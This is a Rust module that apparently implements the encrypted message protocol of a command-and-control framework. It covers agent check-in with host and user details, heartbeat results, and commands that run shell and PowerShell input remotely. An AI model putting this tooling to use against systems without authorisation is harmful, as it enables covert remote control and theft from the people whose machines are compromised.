use std::marker::PhantomData;

use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, aead::{Aead, KeyInit}};
use rand::RngExt;

use bytes::{Buf, BufMut, Bytes, BytesMut};

const MAGIC_NUMBER: u16 = 0xf3f3;
const NONCE_LEN: usize = 12;
const LENGTH_LEN: usize = 8;
const AAD_LEN: usize = NONCE_LEN + LENGTH_LEN;
const TAG_LEN: usize = 16;

#[derive(Default)]
pub struct Packer {
    buf: BytesMut,
}

impl Packer {
    pub fn new() -> Self {
        Self { buf: BytesMut::new() }
    }

    pub fn pack_u8(&mut self, value: u8) -> &mut Self {
        self.buf.put_u8(value);
        self
    }

    pub fn pack_u16(&mut self, value: u16) -> &mut Self {
        self.buf.put_u16(value);
        self
    }

    pub fn pack_u32(&mut self, value: u32) -> &mut Self {
        self.buf.put_u32(value);
        self
    }

    pub fn pack_u64(&mut self, value: u64) -> &mut Self {
        self.buf.put_u64(value);
        self
    }

    pub fn pack_u128(&mut self, value: u128) -> &mut Self {
        self.buf.put_u128(value);
        self
    }

    pub fn pack_bytes(&mut self, value: &[u8]) -> &mut Self {
        self.buf.put_u32(value.len() as u32); // [length][data]
        self.buf.put_slice(value);
        self
    }
    
    // 先頭のLength無しパターン
    // シリアライズ済みオブジェクトのパッキングにのみ使用
    pub fn pack_raw_bytes(&mut self, value: &[u8]) -> &mut Self {
        self.buf.put_slice(value);
        self
    }

    pub fn finish(self) -> Bytes {
        self.buf.freeze()
    }
}

pub struct UnPacker {
    buf: Bytes,
}

impl UnPacker {
    pub fn new(buf: Bytes) -> Self {
        Self { buf }
    }

    pub fn unpack_u8(&mut self) -> anyhow::Result<u8> {
        if self.buf.remaining() < 1 {
            anyhow::bail!("buffer overflow");
        }
        Ok(self.buf.get_u8())
    }

    pub fn unpack_u16(&mut self) -> anyhow::Result<u16> {
        if self.buf.remaining() < 2 {
            anyhow::bail!("buffer overflow");
        }
        Ok(self.buf.get_u16())
    }

    pub fn unpack_u32(&mut self) -> anyhow::Result<u32> {
        if self.buf.remaining() < 4 {
            anyhow::bail!("buffer overflow");
        }
        Ok(self.buf.get_u32())
    }

    pub fn unpack_u64(&mut self) -> anyhow::Result<u64> {
        if self.buf.remaining() < 8 {
            anyhow::bail!("buffer overflow");
        }
        Ok(self.buf.get_u64())
    }

    pub fn unpack_u128(&mut self) -> anyhow::Result<u128> {
        if self.buf.remaining() < 16 {
            anyhow::bail!("buffer overflow");
        }
        Ok(self.buf.get_u128())
    }

    pub fn unpack_bytes(&mut self) -> anyhow::Result<Bytes> {
        let length = self.unpack_u32()? as usize;

        if self.buf.remaining() < length {
            anyhow::bail!("buffer overflow");
        }

        Ok(self.buf.split_to(length))
    }

    pub fn unpack_32bytes(&mut self) -> anyhow::Result<[u8; 32]> {
        let length = self.unpack_u32()? as usize;
        
        if self.buf.remaining() < length {
            anyhow::bail!("buffer overflow");
        }

        if length != 32 {
            anyhow::bail!("Invalid length(unpack_32bytes): length {length}");
        }

        let key_bytes = self.buf.split_to(32);

        Ok(key_bytes.as_ref().try_into()?)
    }


    pub fn unpack_utf8_string(&mut self) -> anyhow::Result<String> {
        let bytes = self.unpack_bytes()?;

        let str = String::from_utf8(bytes.into())
            .map_err(|e| anyhow::anyhow!("Invalid UTF8 String: {e}"))?; 
        Ok(str)
    }

    pub fn unpack_utf16le_string(&mut self) -> anyhow::Result<String> {
        let bytes = self.unpack_bytes()?;
        
        if bytes.len() % 2 != 0 {
            anyhow::bail!("Invalid UTF16 String, odd byte length");
        }

        let u16s: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();

        let str = String::from_utf16(&u16s)
            .map_err(|e| anyhow::anyhow!("Invalid UTF16 String: {e}"))?; 
        Ok(str)
    }

    pub fn unpack_utf16be_string(&mut self) -> anyhow::Result<String> {
        let bytes = self.unpack_bytes()?;
        
        if bytes.len() % 2 != 0 {
            anyhow::bail!("Invalid UTF16 String, odd byte length");
        }

        let u16s: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|c| u16::from_be_bytes([c[0], c[1]]))
            .collect();

        let str = String::from_utf16(&u16s)
            .map_err(|e| anyhow::anyhow!("Invalid UTF16 String: {e}"))?; 
        Ok(str)
    }

}

pub struct Plain;
pub struct Encrypted;

pub struct Packet<State> {
    payload: Bytes,
    _state: PhantomData<State>,
}

impl Packet<Plain> {
    pub fn new(payload: Bytes) -> Self {
        Self { payload, _state: PhantomData }
    }

    pub fn encrypt(self, key: [u8; 32]) -> anyhow::Result<Packet<Encrypted>> {
        let cipher = ChaCha20Poly1305::new(&Key::from(key));

        let mut nonce_bytes = [0_u8; NONCE_LEN];
        rand::rng().fill(&mut nonce_bytes);
        let nonce: Nonce = Nonce::from(nonce_bytes);
        
        let mut cipher_text = cipher.encrypt(&nonce, self.payload.as_ref())
            .map_err(|e| anyhow::anyhow!("Packet encrypt failed: {e}"))?;
        
        let mut nonce_and_cipher = nonce.to_vec();
        nonce_and_cipher.append(&mut cipher_text);  // nonceは先頭に付与

        Ok(Packet {
            payload: nonce_and_cipher.into(),
            _state: PhantomData,
        })
    }

    pub fn deserialize(self) -> anyhow::Result<Payload> {
        Payload::deserialize(self.payload)
    }
}

impl Packet<Encrypted> {
    pub fn new(payload: Bytes) -> Self {
        Self { payload, _state: PhantomData }
    }

    pub fn decrypt(mut self, key: [u8; 32]) -> anyhow::Result<Packet<Plain>> {
        if self.payload.len() < NONCE_LEN {
           anyhow::bail!("Packet decrypt failed: nonce required");
        }
        
        let nonce_bytes: [u8; NONCE_LEN] = self.payload.split_to(NONCE_LEN)
            .as_ref()
            .try_into()
            .map_err(|e| anyhow::anyhow!("expected {NONCE_LEN} bytes: {e}"))?;
        
        let nonce: Nonce = nonce_bytes.into();

        let cipher = ChaCha20Poly1305::new(&Key::from(key));

        let plain = cipher.decrypt(&nonce, self.payload.as_ref()) // split_toのあとなのでpayloadはnonce後の暗号文
            .map_err(|e| anyhow::anyhow!("Packet decrypt failed: {e}"))?;

        Ok(Packet {
            payload: plain.into(),
            _state: PhantomData,
        })
         
    }

}

#[repr(C)]
pub struct Payload {
    pub magic: u16, // 0xf3f3
    pub data: MessageBody,
}

impl Payload {
    pub fn new(body: MessageBody) -> Self {
        Self { magic: 0xf3f3, data: body }
    }

    pub fn serialize(&self) -> Bytes {
        // PackerはトップレベルのPayloadで生成し、下位には可変参照として渡し持ち回る
        let mut p = Packer::new();
        p.pack_u16(self.magic);
        self.data.serialize(&mut p);
        p.finish()
    }

    pub fn deserialize(buf: Bytes) -> anyhow::Result<Self> {
        // UnpackerはトップレベルのPayloadで生成し、下位には可変参照として渡し持ち回る
        let mut u = UnPacker::new(buf);
        let magic = u.unpack_u16()?;

        if magic != 0xf3f3 {
            anyhow::bail!("Invalid magic number ");
        }

        let data = MessageBody::deserialize(&mut u)?;
        Ok(Self { magic, data })
    }
}
// チェックインとBeatの見分け方
// チェックインキーとSessionキー
// すべてのパケットについてチェックインキーで復号を試みて成功すればチェックインプロセスへ移行
// 失敗時には先頭からu32を取得してAgentIDとしてエージェントを特定する
#[repr(u32)]
pub enum MessageBody {
    Checkin {
        agent_pubkey: [u8; 32],
        os: String,
        hostname: String,
        username: String,
        process_name: String,
    } = 0x0001,
    CheckinAck {
        session_pubkey: [u8; 32],
        agent_id: u128,
    } = 0x0002,
    Beat {
        agent_id: u128,
        command_results: CommandResults,
    } = 0x0003,
    Command {
        commands: Commands,
    } = 0x0004,
}

const MSG_CHECKIN:    u8 = 0x01;
const MSG_CHECKINACK: u8 = 0x02;
const MSG_BEAT:       u8 = 0x03;
const MSG_COMMAND:    u8 = 0x04;

const CMD_WHOAMI:     u16 = 0x0001;
const CMD_RUNCMD:     u16 = 0x0002;
const CMD_RUNPS :     u16 = 0x0003;
const CMD_CD:         u16 = 0x0004;
const CMD_LS:         u16 = 0x0005;
const CMD_RUNPROCESS: u16 = 0x0006;

impl MessageBody {
    pub fn body_id(&self) -> u8 {
        match self {
            MessageBody::Checkin { .. } => MSG_CHECKIN,
            MessageBody::CheckinAck { .. } => MSG_CHECKINACK,
            MessageBody::Beat { .. } => MSG_BEAT,
            MessageBody::Command { .. } => MSG_COMMAND,
        }
    }

    pub fn serialize(&self, p: &mut Packer) {
        match self {
            MessageBody::Checkin { 
                agent_pubkey, 
                os, 
                hostname, 
                username, 
                process_name 
            } => {
                p.pack_u8(self.body_id())
                    .pack_bytes(agent_pubkey)
                    .pack_bytes(os.as_bytes())
                    .pack_bytes(hostname.as_bytes())
                    .pack_bytes(username.as_bytes())
                    .pack_bytes(process_name.as_bytes());
            },

            MessageBody::CheckinAck { session_pubkey, agent_id } => {
                p.pack_u8(self.body_id())
                    .pack_bytes(session_pubkey)
                    .pack_u128(*agent_id);
            },
            MessageBody::Command { commands } => {
                p.pack_u8(self.body_id());
                commands.serialize(p);
            },
            MessageBody::Beat { agent_id, command_results } => {
                p.pack_u8(self.body_id())
                    .pack_u128(*agent_id);
                command_results.serialize(p);
            },
        }
    }

    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> {
        let body_id = u.unpack_u8()?;

        match body_id {
            MSG_CHECKIN => Ok(Self::Checkin { 
                agent_pubkey: u.unpack_32bytes()?, 
                os: u.unpack_utf16le_string()?,
                hostname: u.unpack_utf16le_string()?,
                username: u.unpack_utf16le_string()?,
                process_name: u.unpack_utf16le_string()?,
            }),
            MSG_CHECKINACK => Ok(Self::CheckinAck { 
                session_pubkey: u.unpack_32bytes()?,
                agent_id: u.unpack_u128()?,
            }),
            MSG_BEAT => Ok(Self::Beat { 
                agent_id: u.unpack_u128()?,
                command_results: CommandResults::deserialize(u)?,
            }),
            MSG_COMMAND => Ok(Self::Command { 
                commands: Commands::deserialize(u)?,
            }),
            _ => anyhow::bail!("Invalid request id"),
        }
    }
}

pub struct Commands(Vec<Command>);

impl Commands {
    pub fn serialize(&self, p: &mut Packer) {
        p.pack_u32(self.0.len() as u32); // Commandsの要素数を最初に配置
        
        for c in &self.0 {
            c.serialize(p);
        }
    }

    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> { 
        let length = u.unpack_u32()?;
        
        let mut commands = Commands(vec![]);
        
        for _ in 0..length  {
            commands.0.push(Command::deserialize(u)?);
        }

        Ok(commands)

    }
}
pub enum Command {
    Whoami,
    RunCmd { command: String },
    RunPs { script: String },
    Cd { target_dir: String },
    Ls { target_dir: String },
    RunProcess,
}

impl Command {
    pub fn serialize(&self, p: &mut Packer) {
        match self {
            Command::Whoami => {
                p.pack_u16(CMD_WHOAMI);
            },
            Command::RunCmd { command } => {
                p.pack_u16(CMD_RUNCMD);
                p.pack_bytes(command.as_bytes());
            },
            Command::RunPs { script } => {
                p.pack_u16(CMD_RUNPS);
                p.pack_bytes(script.as_bytes());
            },
            Command::Cd { target_dir } => {
                p.pack_u16(CMD_CD);
                p.pack_bytes(target_dir.as_bytes());
            },
            Command::Ls { target_dir } => {
                p.pack_u16(CMD_LS);
                p.pack_bytes(target_dir.as_bytes());
            },
            Command::RunProcess => todo!(),
        }
    }

    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> {
        let command_id = u.unpack_u16()?;

        match command_id {
            CMD_WHOAMI     => Ok(Command::Whoami),
            CMD_RUNCMD     => {
                let command = u.unpack_utf8_string()?;
                Ok(Command::RunCmd { command })
            },
            CMD_RUNPS      => {
                let script = u.unpack_utf8_string()?;
                Ok(Command::RunPs { script })
            },
            CMD_CD         => {
                let target_dir = u.unpack_utf8_string()?;
                Ok(Command::Cd { target_dir })
            },
            CMD_LS         => {
                let target_dir = u.unpack_utf8_string()?;
                Ok(Command::Ls { target_dir })
            },
            CMD_RUNPROCESS => todo!(),
            _ => anyhow::bail!("Invalid command id"),
        }
    }
}

pub struct CommandResults(Vec<CommandResult>);
impl CommandResults {
    pub fn serialize(&self, p: &mut Packer) { 
        p.pack_u32(self.0.len() as u32); // CommandResultの要素数を最初に配置

        for c in &self.0 {
            c.serialize(p);
        }
    }

    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> { 
        let length = u.unpack_u32()?;
        
        let mut results = CommandResults(vec![]);
        
        for _ in 0..length  {
            results.0.push(CommandResult::deserialize(u)?);
        }

        Ok(results)
    }
}

pub enum CommandResult {
    Success { command_id: u32, data: Bytes },
    Error { command_id: u32, winerror: u32, data: Bytes },
}

impl CommandResult {
    pub fn serialize(&self, p: &mut Packer) { 
        match self {
            CommandResult::Success { command_id, data } => {
                p.pack_u32(*command_id)
                    .pack_u8(0x0)
                    .pack_bytes(data);
            },
            CommandResult::Error { command_id, winerror, data } => {
                p.pack_u32(*command_id)
                    .pack_u8(0x1)
                    .pack_u32(*winerror)
                    .pack_bytes(data);
            },
        }
    }

    pub fn deserialize(u: &mut UnPacker) -> anyhow::Result<Self> { 
        let command_id = u.unpack_u32()?;
        let is_error = u.unpack_u8()?;

        if is_error == 0x0 {
            let data = u.unpack_bytes()?;
            return Ok(CommandResult::Success { command_id, data });
        } else {
            let winerror = u.unpack_u32()?;
            let data = u.unpack_bytes()?;
            return Ok(CommandResult::Error { command_id, winerror, data });
        }
    }
}
